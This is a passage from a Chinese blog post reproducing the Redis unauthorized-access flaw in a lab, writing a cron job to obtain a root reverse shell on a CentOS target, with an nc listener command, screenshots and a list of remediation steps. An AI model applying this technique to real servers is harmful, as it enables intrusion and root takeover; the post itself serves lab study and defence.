+<p>查看写入的计划任务的文件<code>/var/spool/cron/root</code></p>
+<p>发现是写入成功了，但是出现乱码。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702786013177-279c28ac-77ab-44a3-aae8-c68e3610cbcc.png" alt="查看写入的计划任务"></p>
+<p> 先直接测试一下看看能不能反弹。</p>
+<p>因为刚才设置计划任务是将shell反弹到kali的6666端口上，所以我们用nc来监听6666端口，看是否能成功反弹</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  -lvvp 6666</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>等了半天，没能成功反弹。 看了其他人的文章后才发现，ubuntu环境下写入计划任务的方式是不能反弹shell的，就是由于这个乱码，而centos环境下是可以的，因为centos可以忽略乱码继续往下执行。</p>
+<h4 id="换成centos环境继续测试"><a href="#换成centos环境继续测试" class="headerlink" title="换成centos环境继续测试"></a>换成centos环境继续测试</h4><p>下面就把靶机换成centos7（192.168.1.134），重复上面的安装操作，在centos上开启redis服务器，再次尝试上述同样的操作。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702782868667-8e42b3d9-bbd2-44df-b821-3c8bea657324.png" alt="kali连接服务器并写入计划任务"></p>
+<p>然后在centos中查看是否成功写入计划任务：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702783121822-bbc3e278-2372-4d63-8f43-6a2ed634b738.png" alt="查看写入的计划任务"></p>
+<p>上面一行是我之前测试的没有成功，下面一行是我现在成功写入的。</p>
+<p>kali上 <code>nc -lvvp 6666</code> 监听6666端口：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702783281278-8e882a8a-8126-4ccb-8b6b-2336ea3e3735.png" alt="成功反弹shell"></p>
+<p>可以看到成功反弹权限为root的shell！至此复现成功。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ol>
+<li><p>禁止Redis服务对公网开放,可通过修改redis.conf配置文件中的bind那行配置 </p>
+</li>
+<li><p>设置密码访问认证,可通过修改redis.conf配置文件中的”requirepass”，增加身份验证</p>
+</li>
+<li><p>对访问源IP进行访问控制,可在防火墙限定指定源ip才可以连接Redis服务器;</p>
+</li>
+<li><p>修改Redis默认端口,将默认的6379端口修改为其他端口。</p>
+</li>
+</ol>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">计划任务详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-windows%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 windows计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 linux计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Ecron"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">关于cron</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crontab%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">crontab常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crontab%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text">crontab配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cron%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.3.4.</span> <span class="toc-text">cron表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 redis未授权漏洞复现（写入计划任务反弹shell）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.4.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.4.2.</span> <span class="toc-text">漏洞产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8D%A2%E6%88%90centos%E7%8E%AF%E5%A2%83%E7%BB%A7%E7%BB%AD%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">换成centos环境继续测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.4.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&text=计划任务详解"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&title=计划任务详解"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&is_video=false&description=计划任务详解"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=计划任务详解&body=Check out this article: https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&title=计划任务详解"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&title=计划任务详解"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&title=计划任务详解"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&title=计划任务详解"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&name=计划任务详解&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&t=计划任务详解"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    anch0r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">首页</a></li><!--
+    --><!--
+      --><li><a href="/archives/">归档</a></li><!--
+    --><!--
+      --><li><a href="/categories/">categories</a></li><!--
+    --><!--
+      --><li><a href="/tags/">tags</a></li><!--
+    --><!--
+      --><li><a href="/about/">关于</a></li><!--
+    --><!--
+      --><li><a href="/search/">搜索</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'jackieya/jackieya.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
